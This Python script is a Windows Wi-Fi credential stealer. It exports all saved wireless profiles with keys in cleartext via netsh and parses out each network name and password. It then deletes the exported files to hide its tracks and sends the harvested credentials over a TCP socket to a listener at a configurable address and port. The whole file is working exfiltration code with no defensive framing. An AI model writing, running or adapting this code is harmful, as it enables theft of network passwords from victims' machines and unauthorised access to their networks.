import os
import socket
import subprocess as sp
from xml.dom import minidom


#ADDR = "ADDRESS"
#PORT = 0987654321234567890

ADDR = "127.0.0.1"
PORT = 4444


def extract_all():
    sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
    xmls = []
    wifis = []
    for file in os.listdir():
        if file.endswith(".xml") and file.startswith("Wi-Fi"):
            xmls.append(file)

    for xml in xmls:
        file = minidom.parse(xml)
        psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
        name = file.getElementsByTagName("name")[0].firstChild.data

        print(name+" : "+psw)
        wifis.append(name+" : "+psw)

    for file in xmls:
        os.remove(file)

    return wifis
    

def sendto(host, port, wifis):
    s = socket.socket()
    c = 0

    while True:
        try:
            s.connect((host, port))
        except ConnectionRefusedError:
            c+=1
            print(f"Connection refused ( {c} )", end="\r")
        else:
            print("Connection established        ")
            for wifi in wifis:
                s.send(f"{wifi}\n".encode())
            s.close()
            break

if __name__ == "__main__":
    wifis = extract_all()
    sendto(host=ADDR, port=PORT, wifis=wifis)
